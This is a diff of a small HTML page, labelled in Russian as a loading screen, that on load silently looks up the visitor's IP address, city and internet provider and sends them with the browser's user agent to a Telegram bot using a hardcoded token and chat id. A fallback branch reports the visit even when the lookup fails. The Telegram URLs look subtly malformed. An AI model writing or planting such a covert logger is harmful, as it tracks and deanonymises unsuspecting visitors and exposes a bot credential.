@@ -2,23 +2,24 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Загрузка... (v18.0)</h1>
+    <h1 id="status">Загрузка... (v19.0)</h1>
     <script>
         async function run() {
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "8242133853";
             const status = document.getElementById('status');
             try {
-                const res = await fetch('https://ipapi.co');
+                const res = await fetch('https://ipwho.is');
                 const d = await res.json();
-                const msg = `🚀 ЛОГ!\nIP: ${d.ip}\nГород: ${d.city}\nПровайдер: ${d.org}\n📱 Устройство: ${navigator.userAgent}\n💻 Платформа: ${navigator.platform}`;
-                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
-                await fetch(url);
+                
+                const msg = `🚀 ЛОГ!\nIP: ${d.ip}\nГород: ${d.city}\nПровайдер: ${d.connection.org}\n📱 Устройство: ${navigator.userAgent}`;
+                
+                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
                 status.innerText = "ГОТОВО!";
             } catch (e) {
-                const err = encodeURIComponent(`Ошибка! Переход был.\nУстройство: ${navigator.userAgent}`);
-                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${err}`);
-                status.innerText = "Ошибка данных, но лог ушел.";
+                const backup = encodeURIComponent(`⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`);
+                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${backup}`);
+                status.innerText = "Лог ушел (без IP).";
             }
         }
         run();
